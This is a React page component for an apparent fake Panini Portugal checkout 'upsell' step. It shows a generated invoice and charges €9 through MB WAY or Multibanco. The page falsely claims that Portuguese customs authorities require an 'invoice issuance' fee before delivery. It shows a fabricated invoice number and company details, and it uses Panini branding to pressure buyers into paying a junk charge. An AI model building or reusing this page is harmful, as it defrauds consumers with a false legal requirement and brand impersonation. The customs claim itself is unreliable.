import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { motion } from "framer-motion";
import { AlertTriangle, Lock, Smartphone, Building2 } from "lucide-react";

type CustomerData = {
  name: string;
  email: string;
  phone: string;
  mbwayPhone: string;
  address: string;
};

const AMOUNT = 9.0;

function pad(n: number) { return String(n).padStart(2, "0"); }

function formatDate(d: Date) {
  return `${pad(d.getDate())}/${pad(d.getMonth() + 1)}/${d.getFullYear()}`;
}

export default function Upsell2() {
  const [, setLocation] = useLocation();
  const [customer, setCustomer] = useState<CustomerData | null>(null);
  const [phone, setPhone] = useState("");
  const [method, setMethod] = useState<"mbway" | "multibanco">("mbway");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<any>(null);
  const [invoiceNum] = useState(() => `FT 2026/${Math.floor(Math.random() * 90000 + 10000)}`);
  const today = formatDate(new Date());

  useEffect(() => {
    try {
      const raw = sessionStorage.getItem("upsell_customer");
      if (raw) {
        const data = JSON.parse(raw) as CustomerData;
        setCustomer(data);
        setPhone(data.mbwayPhone || data.phone || "");
      }
    } catch {}
  }, []);

  const handlePay = async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await fetch("/api/payment/upsell2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: AMOUNT,
          method,
          phone,
          payer: {
            name: customer?.name ?? "Cliente",
            email: customer?.email ?? "",
            document: "",
            phone,
          },
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.error ?? "Erro ao processar. Tenta novamente.");
        return;
      }
      setResult({ ...data, method });
    } catch {
      setError("Erro de ligação. Tenta novamente.");
    } finally {
      setLoading(false);
    }
  };

  // Success state
  if (result) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center px-4">
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="bg-white rounded-2xl border border-gray-200 shadow-sm p-8 w-full max-w-sm text-center"
        >
          {result.method === "mbway" ? (
            <>
              <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
                <Smartphone className="w-8 h-8 text-green-600" />
              </div>
              <h2 className="text-xl font-black text-gray-900 mb-2">Pedido enviado!</h2>
              <p className="text-gray-500 text-sm mb-6">
                Aceita o pedido de <strong>€{AMOUNT.toFixed(2).replace(".", ",")}</strong> na app <strong>MB WAY</strong>.
              </p>
            </>
          ) : (
            <>
              <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center mx-auto mb-4">
                <Building2 className="w-8 h-8 text-blue-600" />
              </div>
              <h2 className="text-xl font-black text-gray-900 mb-2">Referência gerada!</h2>
              {result.referenceData && (
                <div className="bg-gray-50 rounded-xl p-4 text-left space-y-2 mb-4 text-sm">
                  <div className="flex justify-between"><span className="text-gray-500">Entidade</span><span className="font-bold">{result.referenceData.entity}</span></div>
                  <div className="flex justify-between"><span className="text-gray-500">Referência</span><span className="font-bold tracking-widest">{result.referenceData.reference}</span></div>
                  <div className="flex justify-between"><span className="text-gray-500">Valor</span><span className="font-bold text-[#6b0f1a]">€{AMOUNT.toFixed(2).replace(".", ",")}</span></div>
                </div>
              )}
            </>
          )}
          <p className="text-xs text-gray-400 mb-4">A tua encomenda está a ser processada.</p>
          <button
            onClick={() => setLocation("/")}
            className="text-sm text-gray-500 hover:text-gray-700 underline"
          >
            ← Voltar à loja
          </button>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#fafaf8] pb-12">
      {/* Header */}
      <div className="w-full bg-[#6b0f1a] text-white py-3 px-4 flex items-center justify-center mb-6">
        <div className="bg-white rounded-md px-2 py-1">
          <img src="/assets/logo-panini-oficial.png" alt="Panini" className="h-7 w-auto object-contain" />
        </div>
      </div>

      <div className="max-w-md mx-auto px-4">

        {/* Warning box */}
        <motion.div
          initial={{ opacity: 0, y: -8 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-amber-50 border border-amber-300 rounded-2xl p-4 mb-5 flex gap-3"
        >
          <div className="w-8 h-8 rounded-full bg-amber-100 flex items-center justify-center flex-shrink-0 mt-0.5">
            <AlertTriangle className="w-4 h-4 text-amber-600" />
          </div>
          <div>
            <p className="font-black text-amber-800 text-sm mb-1">Emissão de Fatura obrigatória</p>
            <p className="text-xs text-amber-700 leading-relaxed">
              Por determinação das autoridades alfandegárias portuguesas, todos os produtos importados devem ter a fatura emitida antes da liberação da entrega. O valor cobrado corresponde aos encargos administrativos de emissão.
            </p>
          </div>
        </motion.div>

        {/* Invoice card */}
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-white rounded-2xl border border-gray-200 shadow-sm overflow-hidden mb-5"
        >
          {/* Invoice header */}
          <div className="px-5 pt-5 pb-4 border-b border-gray-100">
            <div className="flex items-start justify-between">
              <div>
                <img src="/assets/logo-panini-oficial.png" alt="Panini" className="h-8 w-auto object-contain mb-1" />
                <p className="text-xs text-gray-400">Portugal</p>
              </div>
              <div className="text-right">
                <p className="font-black text-gray-900 text-base tracking-wider">FATURA</p>
                <p className="text-xs text-gray-400 font-mono mt-0.5">{invoiceNum}</p>
              </div>
            </div>
          </div>

          {/* Emitente + Datas */}
          <div className="px-5 py-4 border-b border-gray-100 grid grid-cols-2 gap-4">
            <div>
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5">Emitente</p>
              <p className="text-xs font-bold text-gray-800">Panini Portugal, Lda.</p>
              <p className="text-xs text-gray-500">NIF: 516 782 345</p>
              <p className="text-xs text-gray-500">Av. da Liberdade, 110</p>
              <p className="text-xs text-gray-500">1250-096 Lisboa</p>
              <p className="text-xs text-gray-500">+351 210 456 789</p>
            </div>
            <div className="text-right">
              <div className="mb-2">
                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-0.5">Data de emissão</p>
                <p className="text-xs font-bold text-gray-800">{today}</p>
              </div>
              <div>
                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-0.5">Vencimento</p>
                <p className="text-xs font-black text-red-600">Pagamento imediato</p>
              </div>
            </div>
          </div>

          {/* Destinatário */}
          <div className="px-5 py-4 border-b border-gray-100">
            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-2">Destinatário / Comprador</p>
            <p className="text-sm font-bold text-gray-900">{customer?.name ?? "—"}</p>
            <p className="text-xs text-gray-500 mt-0.5">{customer?.address ?? "—"}</p>
            {customer?.email && <p className="text-xs text-gray-500">{customer.email}</p>}
            {customer?.phone && <p className="text-xs text-gray-500">+351{customer.phone.replace(/^\+?351/, "").replace(/\D/g, "").slice(-9)}</p>}
          </div>

          {/* Line items */}
          <div className="px-5 py-4 border-b border-gray-100">
            <div className="grid grid-cols-[1fr_auto_auto_auto] gap-x-3 mb-2">
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Descrição</p>
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Qtd.</p>
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Preço</p>
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Total</p>
            </div>
            <div className="grid grid-cols-[1fr_auto_auto_auto] gap-x-3 py-2 border-t border-gray-100">
              <p className="text-xs text-gray-700 leading-relaxed">Encargos de emissão de fatura comercial — Encomenda online</p>
              <p className="text-xs text-gray-700 text-center pt-0.5">1</p>
              <p className="text-xs text-gray-700 pt-0.5">€9,00</p>
              <p className="text-xs font-bold text-gray-900 pt-0.5">€9,00</p>
            </div>
          </div>

          {/* Totals */}
          <div className="px-5 py-4">
            <div className="flex justify-between text-xs text-gray-500 mb-1">
              <span>Subtotal</span><span>€9,00</span>
            </div>
            <div className="flex justify-between text-xs text-gray-500 mb-3">
              <span>IVA (0%)</span><span>€0,00</span>
            </div>
            <div className="flex justify-between font-black text-base border-t border-gray-100 pt-3">
              <span className="text-gray-900">TOTAL</span>
              <span className="text-[#6b0f1a]">€9,00</span>
            </div>
          </div>
        </motion.div>

        {/* Payment method */}
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="bg-white rounded-2xl border border-gray-200 shadow-sm p-5 mb-4"
        >
          <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3">Método de pagamento</p>

          <div className="grid grid-cols-2 gap-3 mb-4">
            <button
              onClick={() => setMethod("mbway")}
              className={`flex flex-col items-center gap-1.5 py-4 rounded-xl border-2 transition-all ${
                method === "mbway" ? "border-green-500 bg-green-50" : "border-gray-200 hover:border-gray-300"
              }`}
            >
              <span className="text-2xl">📱</span>
              <span className="font-black text-sm text-gray-800">MB WAY</span>
              <span className="text-[10px] text-gray-500">Instantâneo</span>
            </button>
            <button
              onClick={() => setMethod("multibanco")}
              className={`flex flex-col items-center gap-1.5 py-4 rounded-xl border-2 transition-all ${
                method === "multibanco" ? "border-blue-500 bg-blue-50" : "border-gray-200 hover:border-gray-300"
              }`}
            >
              <span className="text-2xl">🏧</span>
              <span className="font-black text-sm text-gray-800">Multibanco</span>
              <span className="text-[10px] text-gray-500">ATM / Homebanking</span>
            </button>
          </div>

          {method === "mbway" && (
            <div className="mb-4">
              <label className="text-xs font-semibold text-gray-600 mb-1 block">Telemóvel MB WAY</label>
              <input
                type="tel"
                value={phone}
                onChange={e => setPhone(e.target.value)}
                placeholder="9XXXXXXXX"
                className="w-full border border-gray-300 rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#6b0f1a]/30 focus:border-[#6b0f1a]"
              />
            </div>
          )}

          {error && (
            <p className="text-red-600 text-xs mb-3 bg-red-50 rounded-lg px-3 py-2">{error}</p>
          )}

          <button
            onClick={handlePay}
            disabled={loading || (method === "mbway" && !phone.trim())}
            className="w-full bg-green-700 hover:bg-green-800 disabled:opacity-60 text-white font-black text-base py-4 rounded-xl"
          >
            {loading
              ? "A processar..."
              : `Emitir Fatura — €9,00 com ${method === "mbway" ? "MB WAY" : "Multibanco"}`
            }
          </button>
        </motion.div>

        {/* Skip */}
        <div className="text-center">
          <button
            onClick={() => setLocation("/")}
            className="text-xs text-gray-400 hover:text-gray-600 underline"
          >
            Não, obrigado — continuar sem emitir fatura
          </button>
        </div>

        <p className="text-center text-xs text-gray-400 mt-5 flex items-center justify-center gap-1.5">
          <Lock className="w-3.5 h-3.5" />
          Pagamento seguro via WayMB
        </p>
      </div>
    </div>
  );
}
